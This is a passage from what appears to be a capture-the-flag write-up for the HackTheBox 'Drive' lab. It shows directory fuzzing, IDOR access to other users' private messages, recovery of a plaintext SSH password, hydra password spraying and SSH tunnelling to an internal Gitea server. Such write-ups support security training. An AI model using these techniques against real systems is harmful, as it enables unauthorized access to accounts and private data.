<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
</span></span><span class="line"><span class="cl">└─$ cat /etc/hosts                                    
</span></span><span class="line"><span class="cl">127.0.0.1       localhost
</span></span><span class="line"><span class="cl">127.0.1.1       kali
</span></span><span class="line"><span class="cl">::1             localhost ip6-localhost ip6-loopback
</span></span><span class="line"><span class="cl">ff02::1         ip6-allnodes
</span></span><span class="line"><span class="cl">ff02::2         ip6-allrouters
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">10.129.150.85 drive.htb
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="exploring-webapp">Exploring Webapp</h3>
<p>We see what is presumably a Google Drive clone, named <code>Doodle Grive</code>.</p>
<p><img src="/post/hackthebox-drive/Images/landingpage.png"
	width="957"
	height="610"
	srcset="/post/hackthebox-drive/Images/landingpage_hue413d759f6d997543beb3e021bc91435_45695_480x0_resize_box_3.png 480w, /post/hackthebox-drive/Images/landingpage_hue413d759f6d997543beb3e021bc91435_45695_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="156"
		data-flex-basis="376px"
	
></p>
<p>Entering home turns out to be a little different than the main page:</p>
<p><img src="/post/hackthebox-drive/Images/home1.png"
	width="1747"
	height="312"
	srcset="/post/hackthebox-drive/Images/home1_huc32a4111785096c959f544353df9c8d2_25462_480x0_resize_box_3.png 480w, /post/hackthebox-drive/Images/home1_huc32a4111785096c959f544353df9c8d2_25462_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="559"
		data-flex-basis="1343px"
	
></p>
<p>Trying to view the file redirects us to login, so it looks like we must create an account.
Due to password complexity requirements, registered with creds <code>asdf:HackTheBoxDrive</code></p>
<p>After registering, we see the landing page options have changed. We have the option to upload a file, or view currently posted files, shown in the previous image.</p>
<p><img src="/post/hackthebox-drive/Images/landingpage2.png"
	width="864"
	height="606"
	srcset="/post/hackthebox-drive/Images/landingpage2_hudb456d692e2e482cb53a0f8db11d7d66_45314_480x0_resize_box_3.png 480w, /post/hackthebox-drive/Images/landingpage2_hudb456d692e2e482cb53a0f8db11d7d66_45314_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="142"
		data-flex-basis="342px"
	
></p>
<p>When viewing the welcome post, I notice the url info as well as how the text is generated after clicking <code>Just View</code>.</p>
<p><img src="/post/hackthebox-drive/Images/view1.png"
	width="752"
	height="459"
	srcset="/post/hackthebox-drive/Images/view1_huf3cd7d63dd200b4732c42fcbce80ac1d_37590_480x0_resize_box_3.png 480w, /post/hackthebox-drive/Images/view1_huf3cd7d63dd200b4732c42fcbce80ac1d_37590_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="163"
		data-flex-basis="393px"
	
></p>
<p>The 100 might be a beginning number sequence related to each post view. It is possible that this could be susceptible to IDOR. Trying the upload feature, we see the rules applied to our submissions: it must have ASCII MIME type and be under 2MB in size. Uploaded contents are only treated as text, so there is not much to be gained from this feature.</p>
<p><img src="/post/hackthebox-drive/Images/upload1.png"
	width="1197"
	height="468"
	srcset="/post/hackthebox-drive/Images/upload1_hu3158545d9dfd5bcb6d864db9cd20d630_33131_480x0_resize_box_3.png 480w, /post/hackthebox-drive/Images/upload1_hu3158545d9dfd5bcb6d864db9cd20d630_33131_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="255"
		data-flex-basis="613px"
	
></p>
<h4 id="leaking-registered-usernames">Leaking registered usernames</h4>
<p>If we try to create a test group and then edit the group, we can find that all established users are suggested to add, leaking all usernames associated with Doodle Grive.</p>
<p><img src="/post/hackthebox-drive/Images/usernames.png"
	width="613"
	height="456"
	srcset="/post/hackthebox-drive/Images/usernames_hu247eb7500f3f8ab52ca3bd0743a9a424_24832_480x0_resize_box_3.png 480w, /post/hackthebox-drive/Images/usernames_hu247eb7500f3f8ab52ca3bd0743a9a424_24832_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="134"
		data-flex-basis="322px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">jamesMason
</span></span><span class="line"><span class="cl">martinCruz
</span></span><span class="line"><span class="cl">tomHands
</span></span><span class="line"><span class="cl">crisDisel
</span></span><span class="line"><span class="cl">admin
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can enumerate potentially vulnerable directories using feroxbuster:</p>
<h4 id="feroxbuster-results">Feroxbuster Results</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">feroxbuster</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">drive</span><span class="o">.</span><span class="n">htb</span>     
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="n">___</span>  <span class="n">___</span>  <span class="n">__</span>   <span class="n">__</span>     <span class="n">__</span>      <span class="n">__</span>         <span class="n">__</span>   <span class="n">___</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">__</span>  <span class="o">|</span><span class="n">__</span>  <span class="o">|</span><span class="n">__</span><span class="p">)</span> <span class="o">|</span><span class="n">__</span><span class="p">)</span> <span class="o">|</span> <span class="o">/</span>  <span class="err">`</span>    <span class="o">/</span>  \ \<span class="n">_</span><span class="o">/</span> <span class="o">|</span> <span class="o">|</span>  \ <span class="o">|</span><span class="n">__</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span>    <span class="o">|</span><span class="n">___</span> <span class="o">|</span>  \ <span class="o">|</span>  \ <span class="o">|</span> \<span class="n">__</span><span class="p">,</span>    \<span class="n">__</span><span class="o">/</span> <span class="o">/</span> \ <span class="o">|</span> <span class="o">|</span><span class="n">__</span><span class="o">/</span> <span class="o">|</span><span class="n">___</span>
</span></span><span class="line"><span class="cl"><span class="n">by</span> <span class="n">Ben</span> <span class="s2">&#34;epi&#34;</span> <span class="n">Risher</span> <span class="err">🤓</span>                 <span class="n">ver</span><span class="p">:</span> <span class="mf">2.10</span><span class="o">.</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="err">───────────────────────────┬──────────────────────</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/ </span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/register/ </span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/login/ </span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/upload/ </span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/reports/ </span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/contact/block/ </span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/login/block/ </span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/subscribe/block/ </span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/home/block/ </span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/register/block/ </span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/logout/block/ </span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/upload/block/ </span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/reports/block/ </span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 3m     30000/30000   146/s   http://drive.htb/password_reset/ </span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 3m     30000/30000   161/s   http://drive.htb/password_reset/block/ </span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 2m     30000/30000   262/s   http://drive.htb/password_reset/done/</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>It is worth noting that each visiting directory also has a <code>/&lt;dir&gt;/block</code> variant. Although I am not too familiar, perhaps this is a product of the web service being utilized?</p>
<h4 id="abusing-idor-to-view-private-messages">Abusing IDOR to view private messages</h4>
<p>Whe we try to abuse IDOR on views, we are presented with <code>unauthorized</code> flag:</p>
<p><img src="/post/hackthebox-drive/Images/unauthorized.png"
	width="527"
	height="136"
	srcset="/post/hackthebox-drive/Images/unauthorized_hu597b798534d385b16d8b5c8d0869166b_12143_480x0_resize_box_3.png 480w, /post/hackthebox-drive/Images/unauthorized_hu597b798534d385b16d8b5c8d0869166b_12143_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="387"
		data-flex-basis="930px"
	
></p>
<p>If we try to access a file not produced already, we receive a different message:</p>
<p><img src="/post/hackthebox-drive/Images/servererror.png"
	width="513"
	height="223"
	srcset="/post/hackthebox-drive/Images/servererror_hud484effc2ba93cd4ff87843dcab9363e_15927_480x0_resize_box_3.png 480w, /post/hackthebox-drive/Images/servererror_hud484effc2ba93cd4ff87843dcab9363e_15927_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="230"
		data-flex-basis="552px"
	
></p>
<p>We can leak all file numbers associated with created files if we utilize a tool like <code>ffuf</code>. However, it appears it is not necessary. We might eventually find that we can successfully IDOR to unauthorized files using the <code>/&lt;dir&gt;/block</code> variant:</p>
<p><img src="/post/hackthebox-drive/Images/101.png"
	width="970"
	height="497"
	srcset="/post/hackthebox-drive/Images/101_hu443ef8d9705659167b9a76c2fbfe50bc_60478_480x0_resize_box_3.png 480w, /post/hackthebox-drive/Images/101_hu443ef8d9705659167b9a76c2fbfe50bc_60478_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="195"
		data-flex-basis="468px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">hi</span> <span class="n">team</span><span class="o">!</span>  
</span></span><span class="line"><span class="cl"><span class="n">me</span> <span class="ow">and</span> <span class="n">my</span> <span class="n">friend</span><span class="p">(</span><span class="n">Cris</span><span class="p">)</span> <span class="n">created</span> <span class="n">a</span> <span class="n">new</span> <span class="n">scheduled</span> <span class="n">backup</span> <span class="n">plan</span> <span class="k">for</span> <span class="n">the</span> <span class="n">database</span>  
</span></span><span class="line"><span class="cl"><span class="n">the</span> <span class="n">database</span> <span class="n">will</span> <span class="n">be</span> <span class="n">automatically</span> <span class="n">highly</span> <span class="n">compressed</span> <span class="ow">and</span> <span class="n">copied</span> <span class="n">to</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">backups</span><span class="o">/</span> <span class="n">by</span> <span class="n">a</span> <span class="n">small</span> <span class="n">bash</span> <span class="n">script</span> <span class="n">every</span> <span class="n">day</span> <span class="n">at</span> <span class="mi">12</span><span class="p">:</span><span class="mi">00</span> <span class="n">AM</span>  
</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">Note</span><span class="p">:</span> <span class="n">the</span> <span class="n">backup</span> <span class="n">directory</span> <span class="n">may</span> <span class="n">change</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">future</span><span class="o">!</span>  
</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">Note2</span><span class="p">:</span> <span class="n">the</span> <span class="n">backup</span> <span class="n">would</span> <span class="n">be</span> <span class="n">protected</span> <span class="n">with</span> <span class="n">strong</span> <span class="n">password</span><span class="o">!</span> <span class="n">don</span><span class="s1">&#39;t even think to crack it guys! :)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>From our previous leak of established users, we can guess that Cris is referring to the user <code>crisDisel</code>. From here, I proceed to view all messages by visiting <code>http://drive.htb/&lt;NUM&gt;/block/</code>.</p>
<h5 id="fuzzing-numbers-for-valid-messages">Fuzzing numbers for valid messages</h5>
<p>Rather than check manually, here is where we can utilize <code>ffuf</code> to quickly find the ones worth looking at:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Drive]
</span></span><span class="line"><span class="cl">└─$ ffuf -u http://drive.htb/FUZZ/block -w nums.txt -b &#34;sessionid=7ma2mz3s3kr3so2f2f2we9l0m6af034g&#34; -r
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        /&#39;___\  /&#39;___\           /&#39;___\       
</span></span><span class="line"><span class="cl">       /\ \__/ /\ \__/  __  __  /\ \__/       
</span></span><span class="line"><span class="cl">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
</span></span><span class="line"><span class="cl">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
</span></span><span class="line"><span class="cl">         \ \_\   \ \_\  \ \____/  \ \_\       
</span></span><span class="line"><span class="cl">          \/_/    \/_/   \/___/    \/_/       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">       v2.1.0-dev
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> :: Method           : GET
</span></span><span class="line"><span class="cl"> :: URL              : http://drive.htb/FUZZ/block
</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /home/kali/Documents/Drive/nums.txt
</span></span><span class="line"><span class="cl"> :: Header           : Cookie: sessionid=7ma2mz3s3kr3so2f2f2we9l0m6af034g
</span></span><span class="line"><span class="cl"> :: Follow redirects : true
</span></span><span class="line"><span class="cl"> :: Calibration      : false
</span></span><span class="line"><span class="cl"> :: Timeout          : 10
</span></span><span class="line"><span class="cl"> :: Threads          : 40
</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">79                      [Status: 200, Size: 5438, Words: 1216, Lines: 175, Duration: 138ms]
</span></span><span class="line"><span class="cl">99                      [Status: 200, Size: 5058, Words: 1110, Lines: 171, Duration: 85ms]
</span></span><span class="line"><span class="cl">98                      [Status: 200, Size: 5016, Words: 1103, Lines: 171, Duration: 91ms]
</span></span><span class="line"><span class="cl">100                     [Status: 200, Size: 5077, Words: 1147, Lines: 172, Duration: 94ms]
</span></span><span class="line"><span class="cl">101                     [Status: 200, Size: 5478, Words: 1232, Lines: 177, Duration: 107ms]
</span></span><span class="line"><span class="cl">:: Progress: [105/105] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
</span></span></code></pre></td></tr></table>
</div>
</div><p>Since viewing these files requires a login, we must supply the sessionid cookie from our browser session. We also need the <code>-r</code> flag to follow the 301 redirect. Now viewing the other files:
98:
<img src="/post/hackthebox-drive/Images/98.png"
	width="861"
	height="421"
	srcset="/post/hackthebox-drive/Images/98_hu4eecc93c0198f7f7948591fff2a302b0_25120_480x0_resize_box_3.png 480w, /post/hackthebox-drive/Images/98_hu4eecc93c0198f7f7948591fff2a302b0_25120_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="204"
		data-flex-basis="490px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hi team  
</span></span><span class="line"><span class="cl">have a great day.  
</span></span><span class="line"><span class="cl">we are testing the new edit functionality!  
</span></span><span class="line"><span class="cl">it seems to work great!
</span></span></code></pre></td></tr></table>
</div>
</div><p>99:
<img src="/post/hackthebox-drive/Images/99.png"
	width="863"
	height="402"
	srcset="/post/hackthebox-drive/Images/99_hu0c74270a8e29987c44d43c5d9884673c_29377_480x0_resize_box_3.png 480w, /post/hackthebox-drive/Images/99_hu0c74270a8e29987c44d43c5d9884673c_29377_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="214"
		data-flex-basis="515px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hi team  
</span></span><span class="line"><span class="cl">please we have to stop using the document platform for the chat  
</span></span><span class="line"><span class="cl">+I have fixed the security issues in the middleware  
</span></span><span class="line"><span class="cl">thanks! :)
</span></span></code></pre></td></tr></table>
</div>
</div><p>79:
<img src="/post/hackthebox-drive/Images/79.png"
	width="960"
	height="458"
	srcset="/post/hackthebox-drive/Images/79_hu062a1a3bea267dffe2c32cbedfd6c2c9_57285_480x0_resize_box_3.png 480w, /post/hackthebox-drive/Images/79_hu062a1a3bea267dffe2c32cbedfd6c2c9_57285_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="209"
		data-flex-basis="503px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hey team after the great success of the platform we need now to continue the work.  
</span></span><span class="line"><span class="cl">on the new features for ours platform.  
</span></span><span class="line"><span class="cl">I have created a user for martin on the server to make the workflow easier for you please use the password &#34;Xk4@KjyrYv8t194L!&#34;.  
</span></span><span class="line"><span class="cl">please make the necessary changes to the code before the end of the month  
</span></span><span class="line"><span class="cl">I will reach you soon with the token to apply your changes on the repo  
</span></span><span class="line"><span class="cl">thanks!
</span></span></code></pre></td></tr></table>
</div>
</div><p>From these messages, we can gather a password <code>Xk4@KjyrYv8t194L!</code> for user Martin. Additionally to note for the future, there are backups stored in <code>/var/www/backups/</code> that are protected with a very &ldquo;secure&rdquo; password.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="utilizing-password-shared-in-private-messages">Utilizing password shared in private messages</h3>
<p>Using hydra to spray name variants, we find that we can indeed ssh as martin:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Drive]
</span></span><span class="line"><span class="cl">└─$ hydra -L users.txt -p &#39;Xk4@KjyrYv8t194L!&#39; ssh://drive.htb
</span></span><span class="line"><span class="cl">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in 
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span><span class="line"><span class="cl">[DATA] attacking ssh://drive.htb:22/
</span></span><span class="line"><span class="cl">[22][ssh] host: drive.htb   login: martin   password: Xk4@KjyrYv8t194L!
</span></span><span class="line"><span class="cl">1 of 1 target successfully completed, 1 valid password found
</span></span><span class="line"><span class="cl">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-15 12:27:08
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="lateral-movement">Lateral Movement</h2>
<p>Enumerating open ports, we can see port 3000:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">martin@drive:~$ netstat -ntlp
</span></span><span class="line"><span class="cl">(Not all processes could be identified, non-owned process info
</span></span><span class="line"><span class="cl"> will not be shown, you would have to be root to see it all.)
</span></span><span class="line"><span class="cl">Active Internet connections (only servers)
</span></span><span class="line"><span class="cl">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
</span></span><span class="line"><span class="cl">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
</span></span><span class="line"><span class="cl">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
</span></span><span class="line"><span class="cl">tcp6       0      0 :::80                   :::*                    LISTEN      -                   
</span></span><span class="line"><span class="cl">tcp6       0      0 :::22                   :::*                    LISTEN      -                   
</span></span><span class="line"><span class="cl">tcp6       0      0 :::3000                 :::*                    LISTEN      -                   
</span></span></code></pre></td></tr></table>
</div>
</div><p>Using <code>curl</code>, we can see that this is a gitea server:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">martin</span><span class="err">@</span><span class="n">drive</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">$</span> <span class="n">curl</span> <span class="n">localhost</span><span class="p">:</span><span class="mi">3000</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;!</span><span class="n">DOCTYPE</span> <span class="n">html</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">html</span> <span class="n">lang</span><span class="o">=</span><span class="s2">&#34;en-US&#34;</span> <span class="k">class</span><span class="o">=</span><span class="s2">&#34;theme-&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">meta</span> <span class="n">charset</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="n">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span> <span class="n">Gitea</span><span class="p">:</span> <span class="n">Git</span> <span class="n">with</span> <span class="n">a</span> <span class="n">cup</span> <span class="n">of</span> <span class="n">tea</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>To view in our web browser, we can utilize an <code>ssh</code> tunnel:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Drive]
</span></span><span class="line"><span class="cl">└─$ ssh -L 3000:localhost:3000 martin@drive.htb
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now our kali machine is listening on local port 3000, and will forward requests to <code>drive.htb</code>&rsquo;s local port 3000.
In the gitea service, we can login as martin and we can see DoodleGrive source code:</p>
<p><img src="/post/hackthebox-drive/Images/DriveSource.png"
	width="1211"
	height="591"
	srcset="/post/hackthebox-drive/Images/DriveSource_huae11c56d285ba8df56ee3d574a1e5ea5_81220_480x0_resize_box_3.png 480w, /post/hackthebox-drive/Images/DriveSource_huae11c56d285ba8df56ee3d574a1e5ea5_81220_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="204"
		data-flex-basis="491px"
	
></p>
<p>Within <code>db_backup.sh</code>, we can view that the backup script leaks zip passwords:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nv">DB</span><span class="o">=</span><span class="nv">$1</span>
